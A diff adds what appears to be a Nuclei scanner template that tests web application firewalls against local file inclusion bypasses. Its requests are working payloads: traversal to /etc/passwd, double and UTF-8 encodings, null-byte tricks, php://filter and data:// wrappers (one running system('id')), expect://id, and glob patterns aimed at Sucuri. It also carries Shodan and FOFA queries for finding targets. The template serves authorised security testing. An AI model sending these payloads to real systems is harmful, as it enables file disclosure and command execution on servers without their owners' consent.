@@ -1,0 +1,152 @@
+id: waf-lfi-bypass
+info:
+  name: WAF Local File Inclusion Bypass
+  author: waftester
+  severity: high
+  description: |
+    Tests WAF effectiveness against path traversal and local file inclusion
+    bypass techniques. Covers standard traversal, double encoding, null byte
+    injection, PHP wrappers, Windows-specific paths, UTF-8 encoding tricks,
+    and glob pattern bypasses used against Sucuri and other WAFs.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+    - https://github.com/0xInfection/Awesome-WAF
+  tags: lfi,traversal,waf,bypass,owasp-a01,path-traversal,waftester
+  classification:
+    cwe-id:
+      - CWE-22
+      - CWE-98
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 22
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Standard path traversal variations
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../etc/passwd"
+      - "{{BaseURL}}/?file=....//....//....//etc/passwd"
+      - "{{BaseURL}}/?file=..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/?file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
+      - "{{BaseURL}}/?file=..%c0%af..%c0%af..%c0%afetc/passwd"
+      - "{{BaseURL}}/?file=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "localhost"
+        condition: or
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?:[0-9]+:[0-9]+"
+
+  # Double URL encoding
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}/?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      - "{{BaseURL}}/?file=..%25252f..%25252f..%25252fetc%25252fpasswd"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Null byte injection and extension bypass
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=/etc/passwd%00.jpg"
+      - "{{BaseURL}}/?file=/etc/passwd%00.png"
+      - "{{BaseURL}}/?file=../../../etc/passwd%00index.html"
+      - "{{BaseURL}}/?file=....//etc/passwd%00.pdf"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # PHP wrapper and filter chain bypasses
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=php://filter/convert.base64-encode/resource=../../../etc/passwd"
+      - "{{BaseURL}}/?file=php://filter/read=string.rot13/resource=../../../etc/passwd"
+      - "{{BaseURL}}/?file=php://filter/zlib.deflate/convert.base64-encode/resource=../../../etc/passwd"
+      - "{{BaseURL}}/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+      - "{{BaseURL}}/?file=expect://id"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Glob pattern bypasses (effective against Sucuri WAF)
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=/?in/cat+/et?/passw?"
+      - "{{BaseURL}}/?file=/???/??t+/???/??????"
+      - "{{BaseURL}}/?file=/e]t[c/p]a[s]s[wd"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
